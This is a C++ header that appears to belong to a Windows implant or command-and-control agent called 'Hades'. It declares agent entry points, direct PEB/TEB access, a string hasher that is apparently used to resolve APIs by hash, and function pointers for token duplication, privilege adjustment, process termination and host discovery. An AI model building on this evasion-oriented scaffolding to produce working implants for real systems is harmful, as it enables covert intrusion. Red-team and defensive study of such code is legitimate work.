#pragma once
#include <winSock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <sddl.h>

#include "../shared/nt.hpp"
#include "../utils/bytes.hpp"
#include "../utils/apidefs.hpp"
#include "../fileops/files.hpp"
#include "../tokens/tokens.hpp"



struct Config;

#define DECL(x) decltype(x) * x;

#define FILE_CHUNK_SIZE (256 * 1024)

#ifdef _DEBUG
#define DEBUG_LOG(msg, ...) printf(msg "\n", ##__VA_ARGS__)
#define DEBUG_LOG_WIDE(msg, ...) wprintf(msg L"\n", ##__VA_ARGS__)
#else
#define DEBUG_LOG(msg, ...)
#define DEBUG_LOG_WIDE(msg, ...)
#endif


#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
#define BASE_BUFFER_SIZE 64



inline PTEB GetTeb() {
#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
	return (PTEB)__readgsqword(0x30);
#elif defined(__i386__) || defined(_M_IX86)
	return (PTEB)__readgsdword(0x18);
#else
	return NULL;
#endif
}


inline PPEB GetPEB() {
#if defined(__WIN64__) || defined(__x86_64__) || defined(_WIN64)
	return (PPEB)__readgsqword(0x60);
#elif defined(__i386__) || defined(_M_IX86)
	return (PPEB)__readgsdword(0x30);
#else
	return NULL;
#endif
}





typedef struct {
	struct _MODULES {
		HMODULE K32;
		HMODULE IPHLPAPI;
		HMODULE WININET;
		HMODULE NTDLL;
		HMODULE ADVAPI32;
	} Modules;


	struct _NTAPIS {

		DECL(RtlGetVersion);
		DECL(RtlRandomEx);
		DECL(RtlIpv4StringToAddressA);
		DECL(NtOpenProcessToken);
		DECL(NtOpenThreadToken);
		DECL(NtQueryInformationProcess);
		DECL(RtlGetNtVersionNumbers);
		DECL(NtDelayExecution);
		DECL(NtQueryInformationToken);
		DECL(NtQuerySystemInformation);
		DECL(NtOpenProcess);
		DECL(RtlNtStatusToDosError);
		DECL(NtTerminateProcess);
		DECL(RtlAdjustPrivilege);
		DECL(NtDuplicateToken);
		DECL(NtSetInformationThread);

	} NtApis;

	struct _WINAPIS {

		DECL(ReadFile);
		DECL(CreateFileA);
		DECL(DeleteFileA);
		DECL(RemoveDirectoryA);
		DECL(FindFirstFileA);
		DECL(FindNextFileA);
		DECL(CopyFileA);
		DECL(GetCurrentDirectoryA)
			DECL(MoveFileA);
		DECL(SetCurrentDirectoryA);
		DECL(GetModuleFileNameA);
		DECL(GetComputerNameExA);
		DECL(LoadLibraryA);
		DECL(HeapAlloc);
		DECL(HeapReAlloc);
		DECL(GetTickCount);
		DECL(CloseHandle);
		DECL(GetProcAddress);
		DECL(CreateDirectoryA);
		DECL(GetFullPathNameA);
		DECL(GetFileAttributesA);
		DECL(WriteFile);

		DECL(GetUserNameA);
		DECL(GetTokenInformation);
		DECL(LookupPrivilegeNameA);
		DECL(LookupAccountSidA);
		DECL(ConvertSidToStringSidA);


		DECL(GetAdaptersInfo);
		DECL(WSAStartup);

	} WinApis;

	Config* config;

} Hades;

extern Hades* hades;

template<typename T>
T* AllocMemory(size_t size) {
	return (T*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}


BOOL RunHades();
BOOL InitAgent();
DWORD Hasher(PCHAR str);
INT IntFromStr(PCHAR str);